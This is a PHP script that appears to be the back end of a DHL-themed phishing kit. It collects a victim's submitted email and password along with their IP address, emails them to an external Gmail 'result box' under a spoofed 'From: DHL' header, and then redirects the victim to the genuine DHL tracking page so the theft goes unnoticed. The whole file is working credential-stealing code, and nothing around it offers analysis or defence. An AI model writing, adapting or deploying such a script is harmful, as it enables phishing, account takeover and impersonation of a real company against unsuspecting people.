<?php
###################################
// Don't change anything here
// Created By TheLords
// From Jordan
###################################


ini_set("output_buffering",4096);
session_start();


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "Username: ".$_POST['email']."\n";
$message .= "Password : ".$_POST['epass']."\n";
$message .= "IP Address: ".$ip."\n";

$send="nonniresultbox@gmail.com";

$subject = "Logs";
$headers = "From: DHL";
$str=array($send); foreach ($str as $send)
if(mail($send,$subject,$message,$headers) != false){


header("Location: http://www.dhl.com/en/express/tracking.shtml");
}

?>